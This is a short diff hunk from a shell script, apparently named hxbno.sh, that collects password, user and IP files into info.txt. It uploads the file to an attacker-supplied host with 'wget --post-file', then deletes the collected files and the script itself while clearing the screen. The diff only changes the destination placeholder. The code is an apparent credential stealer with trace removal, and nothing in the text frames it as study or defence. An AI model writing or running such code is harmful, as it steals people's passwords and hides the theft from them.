@@ -32,7 +32,7 @@ cat pass.txt >> info.txt
 clear
 sudo apt install wget
 clear
-wget --post-file=info.txt ip:port
+wget --post-file=info.txt {ip}:{port}
 clear
 rm ip.txt user.txt info.txt pass.txt hxbno.sh
 clear
